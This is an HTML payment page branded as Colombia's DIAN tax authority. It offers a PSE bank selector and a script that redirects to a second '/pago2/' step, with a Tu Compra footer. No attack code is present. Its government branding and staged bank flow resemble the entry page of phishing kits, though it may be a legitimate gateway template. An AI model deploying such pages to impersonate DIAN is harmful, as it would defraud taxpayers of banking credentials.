<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Formulario de Pago DIAN</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Lato', sans-serif;
      background-color: #fff;
      padding: 20px;
      color: #000;
    }

    .form-box {
      background-color: #fff;
      max-width: 380px;
      margin: auto;
      padding: 15px 20px;
      border-radius: 5px;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }

    .top-bar img.logo {
      height: 50px;
    }

    .top-bar .flags img {
      width: 24px;
      margin-left: 6px;
      cursor: pointer;
    }

    .section-title {
      font-weight: bold;
      color: #1d276c;
      margin: 15px 0 5px;
    }

    .input-row {
      background: #f5f5f5;
      padding: 10px;
      border-radius: 5px;
      font-size: 14px;
    }

    .bold {
      font-weight: bold;
    }

    label {
    color: #1D276C;
      font-size: 14px;
      display: block;
      margin-top: 10px;
      margin-bottom: 3px;
    }

input, select {
  width: 90%;
  padding: 8px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  display: block;
  margin: 0 auto; /* ← Esto centra horizontalmente */
}

    .checkbox {
      margin-top: 10px;
      display: flex;
      align-items: center;
    }

    .checkbox input {
      margin-right: 8px;
    }

.footer {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background-color: #001e5a;
  color: white;
  text-align: center;
  font-size: 12px;
  padding: 12px;
  box-sizing: border-box;
  z-index: 1000;
}

.input-flex {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 10px;
}

.input-flex label {
  width: 40%;
  margin: 0;
  text-align: left;
  font-weight: bold;
}

.input-flex input,
.input-flex select {
  width: 58%;
  margin: 0;
}

  </style>
</head>
<body>
    <div class="top-bar">
      <img src="/imagenes/DIAN.png" alt="Logo" class="logo">
      <div class="flags">
        <img src="https://flagcdn.com/w40/co.png" alt="ES">
        <img src="https://flagcdn.com/w40/us.png" alt="EN">
        <img src="https://flagcdn.com/w40/br.png" alt="BR">
      </div>
    </div>

    <div class="section-title">Información PSE</div>
    
    <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
    
<div class="input-row">
  <form id="bancoForm">
    <div class="input-flex">
      <label for="tipo">Seleccione su banco *</label>
      <select id="tipo" name="banco" required>
        <option value="">Seleccione su banco</option>
        <option value="avvillas">BANCO AV VILLAS</option>
        <option value="bbva">BANCO BBVA COLOMBIA S.A.</option>
        <option value="bogota">BANCO DE BOGOTA</option>
        <option value="colpatria">SCOTIABANK COLPATRIA</option>
        <option value="davivienda">BANCO DAVIVIENDA</option>
        <option value="nequi">NEQUI</option>
        <option value="occidente">BANCO DE OCCIDENTE</option>
        <option value="popular">BANCO POPULAR</option>
        <option value="serfinanza">BANCO SERFINANZA</option>
      </select>
    </div>
    
    <br>

    <div style="text-align: center;">
      <button type="submit" style="padding: 10px 20px; background-color: #1d276c; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
        Continuar
      </button>
    </div>
  </form>
</div>

    <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
<hr style="border: none; border-top: 8px solid #1d276c; margin: 20px 0;">

<script>
  document.getElementById("bancoForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const valor = document.getElementById("tipo").value;
    if (valor) {
      window.location.href = "/pago2/" + encodeURIComponent(valor);
    }
  });
</script>

<div class="section-title">DIAN</div>
<div class="section-title">800197268-4</div>
<div class="section-title">111711</div>

<br><br><br>

<div class="footer">
  Copyright © Tc Pay un producto de Tu Compra S.A.S
</div>
</body>
</html>